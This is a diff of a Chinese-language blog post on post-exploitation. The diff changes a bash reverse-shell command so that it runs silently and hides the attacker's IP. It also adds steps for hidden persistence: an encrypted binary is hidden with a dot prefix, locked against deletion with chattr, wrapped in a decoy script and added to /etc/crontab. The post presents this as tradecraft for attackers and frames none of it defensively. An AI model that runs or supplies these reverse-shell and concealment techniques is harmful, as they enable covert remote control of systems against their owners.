@@ -334,7 +334,7 @@
 
 
                 <time class="article-time--reading">
-                    12 minute read
+                    13 minute read
                 </time>
             </div>
         
@@ -414,13 +414,13 @@
 <p>但是此处也是有大坑的,能访问国外服务器的目标机器就好办了,直接上就行,但是不能访问国外服务器的目标机器,首先用Cloudflare比较卡,其次用国内的云服务商的则需要实名,而且费用也不低,所以实在没办法就别隐藏了</p>
 <h4 id="33-加密bash反弹shell">3.3 加密bash反弹shell</h4>
 <p>bash反弹shell:</p>
-<p>目标机器反弹shell:</p>
+<p>目标机器反弹shell,不打印输出信息,防止暴露攻击机的ip等:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/攻击机的ip/攻击机接收shell的端口 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/攻击机的ip/攻击机接收shell的端口 0&gt;&amp;1&#34;</span> &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>攻击机接收反弹来的shell:</p>
@@ -536,7 +536,7 @@
 <p>切记要做持久化,不然辛辛苦苦拿的shell可能就要重新拿或者没了,方法很多,可以google搜一下,与时俱进,用最新的东西</p>
 <p>cron计划任务权限维持比较简单,当然也比较明显:</p>
 <p>建议用前面说的shc加密,上传生成的二进制文件,用这个二进制文件弹shell,安全性高一点</p>
-<p>上传之后,先<code>chmod +x 二进制文件</code>给一下权限,然后在名字前面加个<code>.</code>变为隐藏文件(<code>ls -a</code>可以查看隐藏文件),再尝试一下<code>chattr +i 二进制文件</code>(<code>chattr -i 二进制文件</code>可以解除锁定)防止删除,有相应的权限才能成功执行这条命令,最后把这个文件放在安全又隐秘的位置,</p>
+<p>上传之后,先<code>chmod +x 二进制文件</code>给一下权限,然后在名字前面加个<code>.</code>变为隐藏文件(<code>ls -a</code>可以查看隐藏文件),再尝试一下<code>chattr +i 二进制文件</code>(<code>chattr -i 二进制文件</code>可以解除锁定)防止删除,有相应的权限才能成功执行这条命令,最后把这个文件放在安全又隐秘的位置,然后新建一个bash脚本,里面随便填充点内容,然后把调用这个文件的语句放在里面,最后加在/etc/crontab里</p>
 <p>配置cron计划任务时,如果是root用户,那就在/etc/crontab里添加,如果不是root用户,那就用<code>crontab -e</code>添加,注意<code>crontab -e</code>需要交互式shell,理论上来说非root用户的cron存在/var/spool/crond下(CentOS),可以直接编辑相应的文件,但是非root用户通常没有权限直接编辑,所以还是需要获取交互式shell然后<code>crontab -e</code>添加</p>
 <p>/etc/crontab里应该有默认的配置和默认的例子,<code>crontab -e</code>没有,不管是怎么写cron,都建议使用以下配置:</p>
 <p>在写cron之前先执行<code>$PATH</code>查看环境变量并复制,然后再写cron</p>
